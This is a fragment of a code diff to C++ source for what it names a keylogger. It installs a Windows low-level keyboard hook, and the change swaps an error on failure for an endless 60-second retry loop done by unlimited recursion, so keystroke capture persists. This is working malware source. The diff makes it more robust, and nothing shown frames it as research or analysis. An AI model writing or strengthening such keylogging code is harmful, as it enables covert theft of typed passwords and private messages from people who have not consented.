@@ -2,7 +2,8 @@
 #include "keylogger.hpp"
 #include "constants.hpp"
 #include <cstdint>
-#include <stdexcept>
+#include <thread>
+#include <chrono>
 
 // The hook variable shared between the setter and the callback.
 HHOOK hook;
@@ -24,11 +25,15 @@ LRESULT WINAPI hook_callback(int code, WPARAM wparam, LPARAM lparam)
 // Sets the low level keyboard hook.
 void keyboard::set_hook()
 {
+    using namespace std::chrono_literals;
+
     hook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_callback, NULL, 0);
 
+    // If the hook could not be set, try again in 60 seconds.
     if (!hook)
     {
-        throw std::runtime_error{ "The low level keyboard hook could not be set." };
+        std::this_thread::sleep_for(60s);
+        set_hook();
     }
 }
 
